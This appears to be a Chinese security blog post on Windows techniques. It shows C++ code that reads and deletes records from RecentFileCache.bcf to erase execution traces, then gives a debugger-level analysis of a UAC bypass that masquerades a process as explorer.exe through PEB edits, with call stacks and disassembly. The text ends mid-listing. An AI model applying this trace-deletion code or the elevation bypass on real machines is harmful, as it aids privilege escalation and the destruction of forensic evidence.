&#x3D;&#x3D;RecentFileCache.bcf&#x3D;&#x3D; 文件。读取 RecentFileCache 文件时，需要注意文件头部分，文件头出的 shellcode 是固定的。 ShellCode 说明&#x3D;&#x3D;RecentFileCache.bcf&#x3D;&#x3D; 固定的文件头内容 10xFE,0xFF,0xEE,0xFF,0x11,0x22,0x00,0x00,0x03,0x00,0x00,0x00,0x01,0x00,0x00,0x00 代码1234567891011121314151617181920212223242526272829/** * @brief 解析 RecentFileCache 文件内容 * @detail * * @param mapAddress RecentFileCache文件内容 * @param StopSize 停止读取的位置 * @return void */void ListRecord(PVOID mapAddress, int StopSize)&#123; char flag[16] = &#123; 0xFE,0xFF,0xEE,0xFF,0x11,0x22,0x00,0x00,0x03,0x00,0x00,0x00,0x01,0x00,0x00,0x00 &#125;; if (memcmp(mapAddress, flag, 16)) &#123; printf(&quot;[!]Maybe it&#x27;s not RecentFileCache.bcf&quot;); exit(0); &#125; PBCFRECORD currentRecordPtr = NULL; PBCFRECORD nextRecordPtr = (PBCFRECORD)((PBYTE)mapAddress + 0x14); int FlagSize = 0x14; while (FlagSize &lt; StopSize) &#123; currentRecordPtr = nextRecordPtr; FlagSize += nextRecordPtr-&gt;Size * 2 + 6; WCHAR* RecordName = new WCHAR[nextRecordPtr-&gt;Size + 1]; memcpy(RecordName, nextRecordPtr + 1, nextRecordPtr-&gt;Size * 2 + 2); printf(&quot;%ws\\n&quot;, RecordName); nextRecordPtr = (PBCFRECORD)((PBYTE)nextRecordPtr + nextRecordPtr-&gt;Size * 2 + 6); &#125;&#125; 删除记录删除记录基本同读取逻辑一致。由于 RecentFileCache 是按一定的结构写入的，因此在删除时也需要按相应的结构操作。 即：删除一条记录&#x3D;删除记录长度和记录的内容 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/** * @brief DeleteRecord * @detail 删除 RecentFileCache 中的某条记录 * * @param mapAddress RecentFileCache 文件内容 * @param TempBuf 临时存放数组，用来保存删除节点后的内容 * @param StopSize 停止查找的位置 * @param FileName 删除的节点内容 * @return 返回删除记录后的文件内容 * @retval char* */char* DeleteRecord(PVOID mapAddress, char* TempBuf, int StopSize, WCHAR* FileName)&#123; char flag[16] = &#123; 0xFE,0xFF,0xEE,0xFF,0x11,0x22,0x00,0x00,0x03,0x00,0x00,0x00,0x01,0x00,0x00,0x00 &#125;; if (memcmp(mapAddress, flag, 16)) &#123; printf(&quot;[!]Maybe it&#x27;s not RecentFileCache.bcf&quot;); exit(0); &#125; memcpy(TempBuf, mapAddress, 0x14); PBCFRECORD currentRecordPtr = NULL; PBCFRECORD nextRecordPtr = (PBCFRECORD)((PBYTE)mapAddress + 0x14); int DeleteSize = 0; int FlagSize = 0x14; while (FlagSize + DeleteSize &lt; StopSize) &#123; currentRecordPtr = nextRecordPtr; WCHAR* RecordName = new WCHAR[nextRecordPtr-&gt;Size + 1]; memcpy(RecordName, nextRecordPtr + 1, nextRecordPtr-&gt;Size * 2 + 2); printf(&quot;%ws\\n&quot;, RecordName); if (wcscmp(RecordName, FileName) == 0) &#123; printf(&quot;[+]Data found:%ws\\n&quot;, RecordName); DeleteSize += nextRecordPtr-&gt;Size * 2 + 6; &#125; else &#123; memcpy(TempBuf + FlagSize, currentRecordPtr, nextRecordPtr-&gt;Size * 2 + 6); FlagSize += nextRecordPtr-&gt;Size * 2 + 6; &#125; nextRecordPtr = (PBCFRECORD)((PBYTE)nextRecordPtr + nextRecordPtr-&gt;Size * 2 + 6); &#125; NewSize = FlagSize; return TempBuf;&#125; MasqueradePEBToCopyfile 进程伪装成 explorer.exe 进而达到进程提权的目的 参考代码：hfiref0x&#x2F;UACME at 143ead4db6b57a84478c9883023fbe5d64ac277b UAC触发流程在触发 UAC 时，系统会创建一个consent.exe进程，该进程用以确定是否创建管理员进程（通过白名单和用户选择判断），然后creatprocess请求进程,将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名以及发起者的权限是否符合要求，然后决定是否弹出UAC框让用户进行确认。这个UAC框会创建新的安全桌面，屏蔽之前的界面。同时这个UAC框进程是SYSTEM权限进程，其他普通进程也无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员权限启动请求的进程 调用说明修改参数： 接下来需要添加修改PEB结构的功能，为了欺骗PSAPI，共需要修改以下位置： _RTL_USER_PROCESS_PARAMETERS.ImagePathName _RTL_USER_PROCESS_PARAMETERS.CommandLine(可选) _LDR_DATA_TABLE_ENTRY.FullDllName _LDR_DATA_TABLE_ENTRY.BaseDllName 属性说明： FOF_NOCONFIRMATION :不弹出确认框 FOF_SILENT:不弹框 FOFX_SHOWELEVATIONPROMPT:需要提升权限 FOFX_NOCOPYHOOKS:不使用copy hooks FOFX_REQUIREELEVATION:默认需要提升权限 FOF_NOERRORUI:报错不弹框 区别普通进程需要执行两步，伪装进程只需要第二步的提权 获取进程权限 .jtnkoerlbdvh{zoom:50%;} 获取操作权限 .nvwbqqkqalao{zoom:50%;} 调用分析堆栈伪装进程调用栈，执行操作的提权最终调用的 combase!CComActivator::StandardCreateInstance，函数原型见后文。但是普通进程在执行操作前需要调用 _CreateElevatedCopyengine 对当前进程先提权。 123456[0x0] windows_storage!CFileOperation::_PerformProperElevatedOperations + 0x97 [0x1] windows_storage!CFileOperation::_RunElevatedOperation + 0x7b [0x2] windows_storage!CFileOperation::_ProcessLUAOperations + 0x118056 [0x3] windows_storage!CFileOperation::PrepareAndDoOperations + 0x238 [0x4] windows_storage!CFileOperation::PerformOperations + 0xd4 [0x5] MasqueradePEBtoCopyfile!wmain + 0x365 调用堆栈，由上而下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455003a3f43 7c1a jl MasqueradePEBtoCopyfile!wmain+0x36f (003a3f5f)751b226f e8de620000 call windows_storage!CFileOperation::PrepareAndDoOperations (751b8552)751b8785 e8810f0000 call windows_storage!CFileOperation::_ProcessLUAOperations (751b970b)752d175c e88c111a00 call windows_storage!CFileOperation::_RunElevatedOperation (754728ed) # 这里时获取进程的管理员权限 # 获取当前进程 Elevated 7547291d e826c8ffff call windows_storage!CFileOperation::_GetElevatedOperation (7546f148) # 如果没有 调用 CoCreateInstanceAsAdmin 75472935 e8e7b9ffff call windows_storage!CFileOperation::_CreateElevatedCopyengine (7546e321) 7546e35f e8722affff call windows_storage!CoCreateInstanceAsAdmin (75460dd6) 75460e82 ff1544bc5e75 call dword ptr [windows_storage!_imp__CoGetObject (755ebc44)]75472963 e8f5ebffff call windows_storage!CFileOperation::_PerformProperElevatedOperations (7547155d) # 这里获取当前操作的管理员权限 754715d7 ff15ec5a5e75 call dword ptr [windows_storage!__guard_check_icall_fptr (755e5aec)][0x0] combase!ClassicSTAThreadWaitForCall 0xf5d764 0x75e59fe5 [0x1] combase!ThreadSendReceive+0xa8a 0xf5d768 0x75dd77f8 [0x2] combase!CSyncClientCall::SwitchAptAndDispatchCall+0xb16 0xf5d768 0x75dd77f8 [0x3] combase!CSyncClientCall::SendReceive2+0xc05 0xf5d768 0x75dd77f8 [0x4] combase!SyncClientCallRetryContext::SendReceiveWithRetry+0x29 0xf5d948 0x75e5c0a7 [0x5] combase!CSyncClientCall::SendReceiveInRetryContext+0x29 0xf5d948 0x75e5c0a7 [0x6] combase!ClassicSTAThreadSendReceive+0x98 0xf5d948 0x75e5c0a7 [0x7] combase!CSyncClientCall::SendReceive+0x2a7 0xf5da0c 0x75de0468 [0x8] combase!CClientChannel::SendReceive+0x79 0xf5dbf8 0x76516b23 [0x9] combase!NdrExtpProxySendReceive+0xc8 0xf5dbf8 0x76516b23 [0xa] RPCRT4!NdrClientCall2+0x9e3 0xf5dc20 0x75eaeaa0 [0xb] combase!ObjectStublessClient+0x70 0xf5e070 0x75ea6a3f [0xc] combase!ObjectStubless+0xf 0xf5e090 0x75e113f5 [0xd] combase!CRpcResolver::DelegateActivationToSCM+0x30e 0xf5e0a0 0x75e8c69c [0xe] combase!CRpcResolver::CreateInstance+0x14 0xf5e1ac 0x75e12d54 [0xf] combase!CClientContextActivator::CreateInstance+0x144 0xf5e1c8 0x75e124d4 [0x10] combase!ActivationPropertiesIn::DelegateCreateInstance+0xc4 0xf5e420 0x75e3a762 [0x11] combase!ICoCreateInstanceEx+0xc12 0xf5e46c 0x75e399d1 [0x12] combase!CComActivator::DoCreateInstance+0x231 0xf5e770 0x75f4bec1 [0x13] combase!CComActivator::StandardCreateInstance+0x81 0xf5e864 0x75ba8686 [0x14] ole32!CLUAMoniker::CreateInstance+0x126 0xf5f0d4 0x63e8f20f [0x15] comsvcs!CNewMoniker::BindToObject+0x12f 0xf5f114 0x75b869cd [0x16] ole32!CCompositeMoniker::BindToObject+0x19d 0xf5f190 0x75b84f9e [0x17] ole32!CoGetObject+0xbe 0xf5f1c4 0x74e70e88 [0x18] windows_storage!CoCreateInstanceAsAdmin+0xb2 0xf5f210 0x74e7e364 [0x19] windows_storage!CFileOperation::_CreateElevatedCopyengine+0x43 0xf5f518 0x74e8293a [0x1a] windows_storage!CFileOperation::_RunElevatedOperation+0x4d 0xf5f58c 0x74ce1761 [0x1b] windows_storage!CFileOperation::_ProcessLUAOperations+0x118056 0xf5f5c0 0x74bc878a [0x1c] windows_storage!CFileOperation::PrepareAndDoOperations+0x238 0xf5f614 0x74bc2274 [0x1d] windows_storage!CFileOperation::PerformOperations+0xd4 0xf5f684 0xa03f55 [0x1e] MasqueradePEBtoCopyfile!wmain+0x365 0xf5f6b4 0xa047fe [0x1f] MasqueradePEBtoCopyfile!__scrt_wide_environment_policy::initialize_environment+0x2e 0xf5f818 0xa04667 [0x20] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x1d7 0xf5f82c 0xa044fd [0x21] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x6d 0xf5f888 0xa04878 [0x22] MasqueradePEBtoCopyfile!wmainCRTStartup+0x8 0xf5f890 0x76cdfcc9 [0x23] KERNEL32!BaseThreadInitThunk+0x19 0xf5f898 0x77607c6e [0x24] ntdll!__RtlUserThreadStart+0x2f 0xf5f8a8 0x77607c3e [0x25] ntdll!_RtlUserThreadStart+0x1b 0xf5f904 0x0 _RunElevatedOperation 汇编代码： 主要关注一下几个函数： windows_storage!CFileOperation::_GetElevatedOperation (7546f148) windows_storage!CFileOperation::_CreateElevatedCopyengine (7546e321) windows_storage!CFileOperation::_PerformProperElevatedOperations (7547155d) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 windows_storage!CFileOperation::_RunElevatedOperation:754728ed 8bff mov edi, edi754728ef 55 push ebp754728f0 8bec mov ebp, esp754728f2 83ec14 sub esp, 14h754728f5 a1d0085e75 mov eax, dword ptr [windows_storage!__security_cookie (755e08d0)]754728fa 33c5 xor eax, ebp754728fc 8945fc mov dword ptr [ebp-4], eax754728ff 8b4508 mov eax, dword ptr [ebp+8]75472902 53 push ebx75472903 56 push esi75472904 8b750c mov esi, dword ptr [ebp+0Ch]75472907 8bd9 mov ebx, ecx75472909 57 push edi7547290a 8975f8 mov dword ptr [ebp-8], esi7547290d 33ff xor edi, edi7547290f 8945f4 mov dword ptr [ebp-0Ch], eax75472912 8db3b4030000 lea esi, [ebx+3B4h]75472918 393e cmp dword ptr [esi], edi7547291a 7528 jne windows_storage!CFileOperation::_RunElevatedOperation+0x57 (75472944)7547291c 50 push eax7547291d e826c8ffff call windows_storage!CFileOperation::_GetElevatedOperation (7546f148)75472922 8906 mov dword ptr [esi], eax75472924 85c0 test eax, eax75472926 7519 jne windows_storage!CFileOperation::_RunElevatedOperation+0x54 (75472941)75472928 8d83b8030000 lea eax, [ebx+3B8h]7547292e 8bcb mov ecx, ebx75472930 50 push eax75472931 56 push esi75472932 ff75f4 push dword ptr [ebp-0Ch]75472935 e8e7b9ffff call windows_storage!CFileOperation::_CreateElevatedCopyengine (7546e321)7547293a 8945f0 mov dword ptr [ebp-10h], eax7547293d 85c0 test eax, eax7547293f 7859 js windows_storage!CFileOperation::_RunElevatedOperation+0xad (7547299a)75472941 8b45f4 mov eax, dword ptr [ebp-0Ch]75472944 ff75f8 push dword ptr [ebp-8]75472947 8bcb mov ecx, ebx75472949 50 push eax7547294a ff36 push dword ptr [esi]7547294c e82ef2ffff call windows_storage!CFileOperation::_PrepElevatedOperation (75471b7f)75472951 8945f0 mov dword ptr [ebp-10h], eax75472954 85c0 test eax, eax75472956 7842 js windows_storage!CFileOperation::_RunElevatedOperation+0xad (7547299a)75472958 8b06 mov eax, dword ptr [esi]7547295a 8bcb mov ecx, ebx7547295c 57 push edi7547295d 8983bc000000 mov dword ptr [ebx+0BCh], eax75472963 e8f5ebffff call windows_storage!CFileOperation::_PerformProperElevatedOperations (7547155d)75472968 8b0e mov ecx, dword ptr [esi]7547296a 8945f0 mov dword ptr [ebp-10h], eax7547296d 897df8 mov dword ptr [ebp-8], edi75472970 8b01 mov eax, dword ptr [ecx]75472972 8b7058 mov esi, dword ptr [eax+58h]75472975 8d45f8 lea eax, [ebp-8]75472978 50 push eax75472979 51 push ecx7547297a 8bce mov ecx, esi ole32!CoGetObject: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959676da4ee0 8bff mov edi, edi76da4ee2 55 push ebp76da4ee3 8bec mov ebp, esp76da4ee5 83e4f8 and esp, 0FFFFFFF8h76da4ee8 83ec24 sub esp, 24h76da4eeb a100b4e376 mov eax, dword ptr [ole32!__security_cookie (76e3b400)]76da4ef0 33c4 xor eax, esp76da4ef2 89442420 mov dword ptr [esp+20h], eax76da4ef6 8b4508 mov eax, dword ptr [ebp+8]76da4ef9 89442404 mov dword ptr [esp+4], eax76da4efd 8b450c mov eax, dword ptr [ebp+0Ch]76da4f00 53 push ebx76da4f01 56 push esi76da4f02 8b7510 mov esi, dword ptr [ebp+10h]76da4f05 89442408 mov dword ptr [esp+8], eax76da4f09 8b4514 mov eax, dword ptr [ebp+14h]76da4f0c 89442410 mov dword ptr [esp+10h], eax76da4f10 57 push edi76da4f11 85c0 test eax, eax76da4f13 750a jne ole32!CoGetObject+0x3f (76da4f1f)76da4f15 b857000780 mov eax, 80070057h76da4f1a e9ab000000 jmp ole32!CoGetObject+0xea (76da4fca)76da4f1f 832000 and dword ptr [eax], 076da4f22 8d7c241c lea edi, [esp+1Ch]76da4f26 a5 movs dword ptr es:[edi], dword ptr [esi]76da4f27 32c9 xor cl, cl76da4f29 a5 movs dword ptr es:[edi], dword ptr [esi]76da4f2a a5 movs dword ptr es:[edi], dword ptr [esi]76da4f2b a5 movs dword ptr es:[edi], dword ptr [esi]76da4f2c e81b020000 call ole32!CBindCtx::Create (76da514c)76da4f31 8bd8 mov ebx, eax76da4f33 85db test ebx, ebx76da4f35 750a jne ole32!CoGetObject+0x61 (76da4f41)76da4f37 bf0e000780 mov edi, 8007000Eh76da4f3c e987000000 jmp ole32!CoGetObject+0xe8 (76da4fc8)76da4f41 8b4c240c mov ecx, dword ptr [esp+0Ch]76da4f45 85c9 test ecx, ecx76da4f47 7417 je ole32!CoGetObject+0x80 (76da4f60)76da4f49 8b03 mov eax, dword ptr [ebx]76da4f4b 51 push ecx76da4f4c 53 push ebx76da4f4d 8b7018 mov esi, dword ptr [eax+18h]76da4f50 8bce mov ecx, esi76da4f52 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da4f58 ffd6 call esi76da4f5a 8bf8 mov edi, eax76da4f5c 85ff test edi, edi76da4f5e 7858 js ole32!CoGetObject+0xd8 (76da4fb8)76da4f60 8364240c00 and dword ptr [esp+0Ch], 076da4f65 8d44240c lea eax, [esp+0Ch]76da4f69 50 push eax76da4f6a 8d44241c lea eax, [esp+1Ch]76da4f6e 50 push eax76da4f6f ff742418 push dword ptr [esp+18h]76da4f73 53 push ebx76da4f74 e8270d0000 call ole32!MkParseDisplayName (76da5ca0)76da4f79 8bf8 mov edi, eax76da4f7b 85ff test edi, edi76da4f7d 7821 js ole32!CoGetObject+0xc0 (76da4fa0)76da4f7f ff742414 push dword ptr [esp+14h]76da4f83 8b442410 mov eax, dword ptr [esp+10h]76da4f87 8d4c2420 lea ecx, [esp+20h]76da4f8b 51 push ecx76da4f8c 6a00 push 076da4f8e 53 push ebx76da4f8f 8b30 mov esi, dword ptr [eax]76da4f91 50 push eax76da4f92 8b4e20 mov ecx, dword ptr [esi+20h]76da4f95 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da4f9b ff5620 call dword ptr [esi+20h]76da4f9e 8bf8 mov edi, eax76da4fa0 8b4c240c mov ecx, dword ptr [esp+0Ch]76da4fa4 85c9 test ecx, ecx76da4fa6 7410 je ole32!CoGetObject+0xd8 (76da4fb8)76da4fa8 8b01 mov eax, dword ptr [ecx]76da4faa 51 push ecx76da4fab 8b7008 mov esi, dword ptr [eax+8]76da4fae 8bce mov ecx, esi76da4fb0 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da4fb6 ffd6 call esi76da4fb8 8b03 mov eax, dword ptr [ebx]76da4fba 53 push ebx76da4fbb 8b7008 mov esi, dword ptr [eax+8]76da4fbe 8bce mov ecx, esi76da4fc0 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da4fc6 ffd6 call esi76da4fc8 8bc7 mov eax, edi76da4fca 8b4c242c mov ecx, dword ptr [esp+2Ch]76da4fce 5f pop edi76da4fcf 5e pop esi76da4fd0 5b pop ebx76da4fd1 33cc xor ecx, esp76da4fd3 e8387a0000 call ole32!__security_check_cookie (76daca10)76da4fd8 8be5 mov esp, ebp76da4fda 5d pop ebp76da4fdb c21000 ret 10h 普通进程 123456789101112131415161718192021220:000&gt; dt BIND_OPTS3 01153c60ole32!BIND_OPTS3 +0x000 cbStruct : 0x76d82450 +0x004 grfFlags : 1 +0x008 grfMode : 0x24 +0x00c dwTickCountDeadline : 0 +0x010 dwTrackFlags : 2 +0x014 dwClassContext : 0 +0x018 locale : 0 +0x01c pServerInfo : 0x00000015 _COSERVERINFO +0x020 hwnd : 0x00000804 HWND__0:000&gt; dt BIND_OPTS3 010ff58cole32!BIND_OPTS3 +0x000 cbStruct : 0x24 +0x004 grfFlags : 0 +0x008 grfMode : 0 +0x00c dwTickCountDeadline : 0 +0x010 dwTrackFlags : 0 +0x014 dwClassContext : 4 +0x018 locale : 0 +0x01c pServerInfo : (null) +0x020 hwnd : (null) 伪装进程 123456789101112131415161718192021220:000&gt; dt BIND_OPTS3 01043c68ole32!BIND_OPTS3 +0x000 cbStruct : 0x76d82450 +0x004 grfFlags : 1 +0x008 grfMode : 0x24 +0x00c dwTickCountDeadline : 0 +0x010 dwTrackFlags : 2 +0x014 dwClassContext : 0 +0x018 locale : 0 +0x01c pServerInfo : 0x00000015 _COSERVERINFO +0x020 hwnd : 0x00000804 HWND__0:000&gt; dt BIND_OPTS3 00f3f3ecole32!BIND_OPTS3 +0x000 cbStruct : 0x24 +0x004 grfFlags : 0 +0x008 grfMode : 0 +0x00c dwTickCountDeadline : 0 +0x010 dwTrackFlags : 0 +0x014 dwClassContext : 4 +0x018 locale : 0 +0x01c pServerInfo : (null) +0x020 hwnd : (null) 下面是CoGetObject的函数原型和可能的实现： 12345678910111213141516171819202122HRESULT __stdcall CoGetObject(LPCWSTR pszDisplayName, BIND_OPTS* pBindOptions, REFIID riid, void** ppv)&#123; HRESULT hr = 0; IBindCtx* pBindCtx = 0; hr = CreateBindCtx(0, &amp;pBindCtx); ULONG chEaten; IMoniker* pMoniker = 0; hr = MkParseDisplayName(pBindCtx, pszDisplayName, &amp;chEaten, &amp;pMoniker); hr = pBindCtx-&gt;SetBindOptions(pBindOptions); hr = pMoniker-&gt;BindToObject(pBindCtx, NULL, riid, ppv); // 普通进程在这个函数中进行的UAC pMoniker-&gt;Release(); pBindCtx-&gt;Release(); return hr;&#125; BindToObject 汇编代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183 ole32!CCompositeMoniker::BindToObject:76da6830 8bff mov edi, edi76da6832 55 push ebp76da6833 8bec mov ebp, esp76da6835 83ec0c sub esp, 0Ch76da6838 53 push ebx76da6839 8b5d18 mov ebx, dword ptr [ebp+18h]76da683c 56 push esi76da683d 57 push edi76da683e 85db test ebx, ebx76da6840 0f84da010000 je ole32!CCompositeMoniker::BindToObject+0x1f0 (76da6a20)76da6846 8b750c mov esi, dword ptr [ebp+0Ch]76da6849 832300 and dword ptr [ebx], 076da684c 56 push esi76da684d e8fefaffff call ole32!IsValidInterface (76da6350)76da6852 85c0 test eax, eax76da6854 0f84c6010000 je ole32!CCompositeMoniker::BindToObject+0x1f0 (76da6a20)76da685a 8b7d10 mov edi, dword ptr [ebp+10h]76da685d 85ff test edi, edi76da685f 740e je ole32!CCompositeMoniker::BindToObject+0x3f (76da686f)76da6861 57 push edi76da6862 e8e9faffff call ole32!IsValidInterface (76da6350)76da6867 85c0 test eax, eax76da6869 0f84b1010000 je ole32!CCompositeMoniker::BindToObject+0x1f0 (76da6a20)76da686f 832300 and dword ptr [ebx], 076da6872 8365fc00 and dword ptr [ebp-4], 076da6876 85ff test edi, edi76da6878 0f85a4000000 jne ole32!CCompositeMoniker::BindToObject+0xf2 (76da6922)76da687e 8b06 mov eax, dword ptr [esi]76da6880 8b7820 mov edi, dword ptr [eax+20h]76da6883 8d45f8 lea eax, [ebp-8]76da6886 50 push eax76da6887 56 push esi76da6888 81ff2070da76 cmp edi, offset ole32!CBindCtx::GetRunningObjectTable (76da7020)76da688e 7507 jne ole32!CCompositeMoniker::BindToObject+0x67 (76da6897)76da6890 e88b070000 call ole32!CBindCtx::GetRunningObjectTable (76da7020)76da6895 eb0a jmp ole32!CCompositeMoniker::BindToObject+0x71 (76da68a1)76da6897 8bcf mov ecx, edi76da6899 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da689f ffd7 call edi76da68a1 8bf8 mov edi, eax76da68a3 85ff test edi, edi76da68a5 7571 jne ole32!CCompositeMoniker::BindToObject+0xe8 (76da6918)76da68a7 8b4df8 mov ecx, dword ptr [ebp-8]76da68aa 8b01 mov eax, dword ptr [ecx]76da68ac 8b7018 mov esi, dword ptr [eax+18h]76da68af 8d45f4 lea eax, [ebp-0Ch]76da68b2 50 push eax76da68b3 ff7508 push dword ptr [ebp+8]76da68b6 51 push ecx76da68b7 81fef06fda76 cmp esi, offset ole32!CRunningObjectTable::GetObjectW (76da6ff0)76da68bd 7507 jne ole32!CCompositeMoniker::BindToObject+0x96 (76da68c6)76da68bf e82c070000 call ole32!CRunningObjectTable::GetObjectW (76da6ff0)76da68c4 eb0a jmp ole32!CCompositeMoniker::BindToObject+0xa0 (76da68d0)76da68c6 8bce mov ecx, esi76da68c8 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da68ce ffd6 call esi76da68d0 8bf8 mov edi, eax76da68d2 8b45f8 mov eax, dword ptr [ebp-8]76da68d5 50 push eax76da68d6 8b08 mov ecx, dword ptr [eax]76da68d8 8b7108 mov esi, dword ptr [ecx+8]76da68db 8bce mov ecx, esi76da68dd ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da68e3 ffd6 call esi76da68e5 85ff test edi, edi76da68e7 7536 jne ole32!CCompositeMoniker::BindToObject+0xef (76da691f)76da68e9 8b4df4 mov ecx, dword ptr [ebp-0Ch]76da68ec 85c9 test ecx, ecx76da68ee 742f je ole32!CCompositeMoniker::BindToObject+0xef (76da691f)76da68f0 8b01 mov eax, dword ptr [ecx]76da68f2 53 push ebx76da68f3 ff7514 push dword ptr [ebp+14h]76da68f6 8b30 mov esi, dword ptr [eax]76da68f8 51 push ecx76da68f9 8bce mov ecx, esi76da68fb ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da6901 ffd6 call esi76da6903 8bf8 mov edi, eax76da6905 8b45f4 mov eax, dword ptr [ebp-0Ch]76da6908 50 push eax76da6909 8b08 mov ecx, dword ptr [eax]76da690b 8b7108 mov esi, dword ptr [ecx+8]76da690e 8bce mov ecx, esi76da6910 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da6916 ffd6 call esi76da6918 8bc7 mov eax, edi76da691a e906010000 jmp ole32!CCompositeMoniker::BindToObject+0x1f5 (76da6a25)76da691f 8b7d10 mov edi, dword ptr [ebp+10h]76da6922 8b4d08 mov ecx, dword ptr [ebp+8]76da6925 e803dbffff call ole32!CCompositeMoniker::AllButLast (76da442d)76da692a 8bd8 mov ebx, eax76da692c 85db test ebx, ebx76da692e 7507 jne ole32!CCompositeMoniker::BindToObject+0x107 (76da6937)76da6930 bf0e000780 mov edi, 8007000Eh76da6935 ebe1 jmp ole32!CCompositeMoniker::BindToObject+0xe8 (76da6918)76da6937 8b4d08 mov ecx, dword ptr [ebp+8]76da693a e8f8dcffff call ole32!CCompositeMoniker::Last (76da4637)76da693f 8945f4 mov dword ptr [ebp-0Ch], eax76da6942 85c0 test eax, eax76da6944 750a jne ole32!CCompositeMoniker::BindToObject+0x120 (76da6950)76da6946 bf0e000780 mov edi, 8007000Eh76da694b e98a000000 jmp ole32!CCompositeMoniker::BindToObject+0x1aa (76da69da)76da6950 85ff test edi, edi76da6952 7436 je ole32!CCompositeMoniker::BindToObject+0x15a (76da698a)76da6954 8b37 mov esi, dword ptr [edi]76da6956 8d45fc lea eax, [ebp-4]76da6959 50 push eax76da695a 6a00 push 076da695c 53 push ebx76da695d 8b4e2c mov ecx, dword ptr [esi+2Ch]76da6960 57 push edi76da6961 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da6967 ff562c call dword ptr [esi+2Ch]76da696a 8bf8 mov edi, eax76da696c 85ff test edi, edi76da696e 792d jns ole32!CCompositeMoniker::BindToObject+0x16d (76da699d)76da6970 8b75f4 mov esi, dword ptr [ebp-0Ch]76da6973 8b06 mov eax, dword ptr [esi]76da6975 56 push esi76da6976 8b4008 mov eax, dword ptr [eax+8]76da6979 8945f4 mov dword ptr [ebp-0Ch], eax76da697c 3d106dda76 cmp eax, offset ole32!CClassMoniker::Release (76da6d10)76da6981 754c jne ole32!CCompositeMoniker::BindToObject+0x19f (76da69cf)76da6983 e888030000 call ole32!CClassMoniker::Release (76da6d10)76da6988 eb50 jmp ole32!CCompositeMoniker::BindToObject+0x1aa (76da69da)76da698a 895dfc mov dword ptr [ebp-4], ebx76da698d 8b03 mov eax, dword ptr [ebx]76da698f 53 push ebx76da6990 8b7004 mov esi, dword ptr [eax+4]76da6993 8bce mov ecx, esi76da6995 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)] # 在这里发起uac76da699b ffd6 call esi76da699d ff7518 push dword ptr [ebp+18h]76da69a0 8b75f4 mov esi, dword ptr [ebp-0Ch]76da69a3 ff7514 push dword ptr [ebp+14h]76da69a6 ff75fc push dword ptr [ebp-4]76da69a9 8b06 mov eax, dword ptr [esi]76da69ab ff750c push dword ptr [ebp+0Ch]76da69ae 56 push esi76da69af 8b7820 mov edi, dword ptr [eax+20h]76da69b2 81ffb054da76 cmp edi, offset ole32!CClassMoniker::BindToObject (76da54b0)76da69b8 7509 jne ole32!CCompositeMoniker::BindToObject+0x193 (76da69c3)76da69ba e8f1eaffff call ole32!CClassMoniker::BindToObject (76da54b0)76da69bf 8bf8 mov edi, eax76da69c1 ebb0 jmp ole32!CCompositeMoniker::BindToObject+0x143 (76da6973)76da69c3 8bcf mov ecx, edi76da69c5 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da69cb ffd7 call edi76da69cd ebf0 jmp ole32!CCompositeMoniker::BindToObject+0x18f (76da69bf)76da69cf 8bc8 mov ecx, eax76da69d1 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da69d7 ff55f4 call dword ptr [ebp-0Ch]76da69da 8b03 mov eax, dword ptr [ebx]76da69dc 53 push ebx76da69dd 8b7008 mov esi, dword ptr [eax+8]76da69e0 81fe906cda76 cmp esi, offset ole32!CSessionMoniker::Release (76da6c90)76da69e6 7507 jne ole32!CCompositeMoniker::BindToObject+0x1bf (76da69ef)76da69e8 e8a3020000 call ole32!CSessionMoniker::Release (76da6c90)76da69ed eb0a jmp ole32!CCompositeMoniker::BindToObject+0x1c9 (76da69f9)76da69ef 8bce mov ecx, esi76da69f1 ff15f4d9e376 call dword ptr [ole32!__guard_check_icall_fptr (76e3d9f4)]76da69f7 ffd6 call esi76da69f9 8b4dfc mov ecx, dword ptr [ebp-4]76da69fc 85c9 test ecx, ecx76da69fe 0f8414ffffff je ole32!CCompositeMoniker::BindToObject+0xe8 (76da6918)76da6a04 8b01 mov eax, dword ptr [ecx]76da6a06 51 push ecx76da6a07 8b7008 mov esi, dword ptr [eax+8]76da6a0a 81fe906cda76 cmp esi, offset ole32!CSessionMoniker::Release (76da6c90)76da6a10 0f85f8feffff jne ole32!CCompositeMoniker::BindToObject+0xde (76da690e)76da6a16 e875020000 call ole32!CSessionMoniker::Release (76da6c90)76da6a1b e9f8feffff jmp 